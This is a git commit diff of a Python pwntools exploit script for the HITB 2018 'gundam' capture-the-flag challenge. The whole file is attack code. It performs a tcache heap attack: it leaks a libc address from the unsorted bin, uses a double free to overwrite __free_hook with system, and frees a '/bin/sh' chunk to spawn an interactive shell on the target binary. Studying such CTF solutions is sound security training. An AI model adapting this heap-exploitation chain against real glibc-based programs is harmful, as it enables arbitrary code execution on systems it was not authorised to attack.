d0a20ab4f349ef91661ee8fffd30cd5bc8b406d4
0x01f <aboultraman@gmail.com>
2018-08-10 11:46:12 +0800

    tcache; tcache bin attack

--- hitb2018_gundam/solve.py
+++ hitb2018_gundam/solve.py
@@ -1,51 +1,56 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+__Auther__ = 'M4x'
+
 from pwn import *
-context.log_level = "debug"
+#  context.log_level = "debug"
 
 def build(name):
-	io.sendlineafter(' :', "1")
-	io.sendafter(' :', name)
-	io.sendlineafter(' :', "1")
+    io.sendlineafter(' :', "1")
+    io.sendafter(' :', name)
+    io.sendlineafter(' :', "1")
 
 def visit():
-	io.sendlineafter(' :', "2")
+    io.sendlineafter(' :', "2")
 
-def destroy(idx):
-	io.sendlineafter(' :', "3")
-        io.sendlineafter(":", str(idx))
+def destory(idx):
+    io.sendlineafter(' :', "3")
+    io.sendlineafter(":", str(idx))
 
 def blow():
-	io.sendlineafter(' :', "4")
+    io.sendlineafter(' :', "4")
 
-io = process("./gundam")
-libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
-
-for i in xrange(9):
-	build('m4x') 
+io = process("./gundam", env = {"LD_PRELOAD": "./libc.so.6"})
+libc = ELF("./libc.so.6")
 
 for i in xrange(9):
-	destroy(i)
+    build("AAAA")
+for i in xrange(9):
+    destory(i)  # 7 tcache bins, 2 unsorted bins
+
 blow()
 for i in xrange(8):
-	build('a' * 8)
+    build('BBBBBBBB')
 
-build('a'*8)
+build('CCCCCCCC')
 visit()
 
-io.recvuntil('Gundam[7] :aaaaaaaa')
+main_arena = 0x3dac20
+libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 88 - main_arena
+success("libc -> {:#x}".format(libc.address))
 
-libc.address = u64(io.recv(6).ljust(8,'\0')) - 88 - 0x10 - libc.symbols['__malloc_hook']
-print '[*] system:',hex(libc.symbols['system'])
-for i in range(0,8):
-	destroy(i)
+for i in xrange(8):
+    destory(i)
 blow()
-build('m4x') #0
-build('/bin/sh\0') #0 1
-build('m4x') #0
-destroy(0)
-destroy(0)
-build(p64(libc.symbols['__free_hook'] - 0x10))# 0 1 2
-build('a' * 0x30)
-build(p64(libc.symbols['system']) * 3)
-destroy(1)
+
+build("0000")
+build("/bin/sh\0")
+build("2222")
+destory(0)
+destory(0)
+build(p64(libc.sym['__free_hook'] - 0x10))
+build("/bin/sh\0")
+build(p64(libc.sym['system']) * 3)
+destory(1)
 
 io.interactive()
